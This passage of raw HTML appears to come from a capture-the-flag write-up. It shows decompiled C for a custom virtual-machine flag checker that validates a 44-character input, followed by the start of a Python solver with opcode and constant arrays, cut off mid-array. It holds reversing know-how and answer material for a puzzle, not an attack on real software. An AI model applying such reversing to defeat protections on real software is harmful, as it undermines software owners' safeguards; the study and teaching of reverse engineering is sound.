class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_80487A8</span><span class="params">(_DWORD *reg)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"><span class="type">int</span> reg[<span class="number">999</span>];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">113</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">6</span>] -= <span class="number">4</span>;</span><br><span class="line">      *(_DWORD *)reg[<span class="number">6</span>] = *(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">65</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] += reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] -= reg[<span class="number">4</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">67</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">56</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">57</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">53</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xF7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">68</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] /= reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[sub_804875F(reg, <span class="number">1</span>)] = *(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">2</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">119</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">83</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(*(<span class="type">char</span> *)reg[<span class="number">3</span>]);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">34</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0x99</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">118</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">3</span>] = *(_DWORD *)reg[<span class="number">6</span>];</span><br><span class="line">      *(_DWORD *)reg[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">      reg[<span class="number">6</span>] += <span class="number">4</span>;</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">84</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (_BYTE *)reg[<span class="number">3</span>];</span><br><span class="line">      *v1 = getchar();</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">48</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] |= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">3</span>] = *(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = <span class="number">1877735783</span>;</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">51</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">2</span>] = *(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xFE</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, reg[<span class="number">1</span>]);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( reg[<span class="number">1</span>] != <span class="number">1877735783</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, s, <span class="number">0x2C</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">44</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">0</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fog[*(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>)] = reg[<span class="number">1</span>];</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">3</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = (<span class="type">unsigned</span> __int8)s[*(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>)];</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( exit_door[<span class="number">0</span>] != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( exit_door[<span class="number">1</span>] != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)*(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">1</span>) != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后转换写出来就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">flagafter = []</span><br><span class="line">fog = [<span class="number">0x0000007B</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000037</span>, <span class="number">0x000000E8</span>]</span><br><span class="line"></span><br><span class="line">exit_door = [<span class="number">0xCF1304DC</span>, <span class="number">0x283B8E84</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = [<span class="number">0xA1</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x02</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDD</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x03</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x04</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x06</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0A</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0C</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0E</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x11</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x13</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x14</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x15</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x17</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x18</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x19</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1A</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1C</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1F</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x20</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x21</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span 